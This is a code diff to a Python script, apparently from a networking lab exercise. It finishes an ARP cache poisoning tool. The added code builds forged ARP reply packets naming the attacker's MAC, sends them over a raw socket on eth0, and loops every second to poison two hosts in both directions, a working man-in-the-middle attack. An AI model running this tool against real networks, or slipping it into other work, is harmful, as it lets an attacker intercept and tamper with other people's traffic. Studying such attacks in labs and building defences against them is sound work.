@@ -2,6 +2,8 @@
 
 import argparse
 import socket, struct
+import time
+
 
 ETH_TYPE = 0x0806
 
@@ -137,73 +139,6 @@ def parse_arp_packet(packet, addr):
     print(f"  Interface: {addr[0] if addr else 'unknown'}")
 
 
-from getmac import get_mac_address as gma
-import binascii
-
-IP_SOURCE  = '1.1.1.10'
-MAC_SOURCE = '02:42:01:01:01:0a'
-IP_TARGET  = '1.1.1.20'
-MAC_TARGET = '02:42:01:01:01:14'
-MAC_ATTACKER = gma()
-
-def create_eth_header():
-    h_dest = binascii.unhexlify(MAC_ATTACKER.replace(':', ''))
-    h_source = binascii.unhexlify(MAC_SOURCE.replace(':', ''))
-    h_proto = ETH_TYPE
-    eth_header = struct.pack(
-        '!6s6sH',
-        h_dest, h_source, h_proto
-    )
-    print(eth_header)
-    return eth_header
-
-ETH_ALEN        = 6 # Octets in one ethernet addr
-
-# These are the defined Ethernet Protocol ID's.
-ETH_P_IP        = 0x0800 # Internet Protocol packets
-
-# ARP protocol HARDWARE identifiers
-ARPHRD_ETHER    = 1 # Ethernet 10Mbps
-
-# ARP protocol opcodes.
-ARPOP_REQUEST   = 1
-ARPOP_REPLY     = 2
-ARPOP_RREQUEST  = 3
-ARPOP_RREPLY    = 4
-ARPOP_INREQUEST = 8
-ARPOP_INREPLY   = 9
-ARPOP_NAK       = 10
-
-def create_arp_packet():
-    # ARP HEADER
-    ar_hrd = socket.htons(ARPHRD_ETHER)
-    ar_pro = socket.htons(ETH_P_IP)
-    ar_hln = ETH_ALEN
-    ar_pln = 4
-    ar_op  = socket.htons(ARPOP_REPLY)
-
-    # ARP DATA
-    ar_sha = binascii.unhexlify(MAC_ATTACKER.replace(':', ''))
-    ar_sip = socket.inet_aton(IP_TARGET)
-    ar_tha = binascii.unhexlify(MAC_SOURCE.replace(':', ''))
-    ar_tip = socket.inet_aton(IP_SOURCE)
-
-    arp_packet = struct.pack(
-        '!HHBBH6s4s6s4s',
-        ar_hrd, ar_pro, ar_hln, ar_pln, ar_op,
-        ar_sha, ar_sip,
-        ar_tha, ar_tip
-    )
-    print(arp_packet)
-    return arp_packet
-
-def send_packet():
-    eth_header = create_eth_header()
-    arp_packet = create_arp_packet()
-    full_arp_packet = eth_header + arp_packet
-    # TODO : socket.sendto()
-
-
 def recv_packet(socket):
     while True:
         try:
@@ -217,12 +152,105 @@ def recv_packet(socket):
         except Exception as e:
             print("Error: ", e)
 
+
+from getmac import get_mac_address as gma
+import binascii
+
+# https://docs.huihoo.com/doxygen/linux/kernel/3.7/uapi_2linux_2if__ether_8h.html
+
+ETH_ALEN        = 6 # Octets in one ethernet addr
+
+# These are the defined Ethernet Protocol ID's.
+ETH_P_IP        = 0x0800 # Internet Protocol packets
+ETH_P_ARP       = 0x0806 # Address Resolution packet
+# ARP protocol HARDWARE identifiers
+ARPHRD_ETHER    = 1 # Ethernet 10Mbps
+
+# ARP protocol opcodes.
+ARPOP_REQUEST   = 1
+ARPOP_REPLY     = 2
+ARPOP_RREQUEST  = 3
+ARPOP_RREPLY    = 4
+ARPOP_INREQUEST = 8
+ARPOP_INREPLY   = 9
+ARPOP_NAK       = 10
+
+IP_SOURCE  = '1.1.1.10'
+MAC_SOURCE = '02:42:01:01:01:0a'
+IP_TARGET  = '1.1.1.20'
+MAC_TARGET = '02:42:01:01:01:14'
+MAC_ATTACKER = gma()
+
+def create_eth_header(mac_target):
+    h_dest = binascii.unhexlify(mac_target.replace(':', ''))
+    h_source = binascii.unhexlify(MAC_ATTACKER.replace(':', ''))
+    h_proto = ETH_P_ARP
+    eth_header = struct.pack(
+        '!6s6sH',
+        h_dest, h_source, h_proto
+    )
+    # print("ETH_HDR: ", eth_header)
+    return eth_header
+
+def create_arp_packet(ip_src, ip_target, mac_target):
+    # ARP HEADER
+    ar_hrd = ARPHRD_ETHER
+    ar_pro = ETH_P_IP
+    ar_hln = ETH_ALEN
+    ar_pln = 4
+    ar_op  = ARPOP_REPLY
+
+    # ARP DATA
+    ar_sha = binascii.unhexlify(MAC_ATTACKER.replace(':', ''))
+    ar_sip = socket.inet_aton(ip_src)
+    ar_tha = binascii.unhexlify(mac_target.replace(':', ''))
+    ar_tip = socket.inet_aton(ip_target)
+
+    arp_packet = struct.pack(
+        '!HHBBH6s4s6s4s',
+        ar_hrd, ar_pro, ar_hln, ar_pln, ar_op,
+        ar_sha, ar_sip,
+        ar_tha, ar_tip
+    )
+    # print("ARP_PACKET: ", arp_packet)
+    return arp_packet
+
+def create_sendto_socket():
+    try:
+        return socket.socket(
+            socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ARP)
+        )
+    except Exception as e:
+        print(f"Error: {e}")
+
+
+def send_packet(ip_src, ip_target, mac_target):
+    eth_header = create_eth_header(mac_target)
+    arp_packet = create_arp_packet(ip_src, ip_target, mac_target)
+    full_arp_packet = eth_header + arp_packet
+    # print("FULL_ARP: ", full_arp_packet)
+    sendto_sock = create_sendto_socket()
+    sent = sendto_sock.sendto(
+        full_arp_packet,
+        ("eth0", 0, 0, 0, b'')
+    )
+    print(".", end='', flush=True)
+    sendto_sock.close()
+
+def poison_target(ip_src, ip_target, mac_target):
+    send_packet(ip_src, ip_target, mac_target)
+
+
 if __name__ == "__main__":
     try:
-        server_socket = create_server_socket()
-        send_packet()
+        # server_socket = create_server_socket()
+        while True:
+            poison_target(IP_SOURCE, IP_TARGET, MAC_TARGET)
+            poison_target(IP_TARGET, IP_SOURCE, MAC_SOURCE)
+            # print('-'*50)
+            time.sleep(1)
         recv_packet(server_socket)
     except KeyboardInterrupt:
         print("keyboard interrupt")
-    finally:
-        server_socket.close()
+    # finally:
+        # server_socket.close()
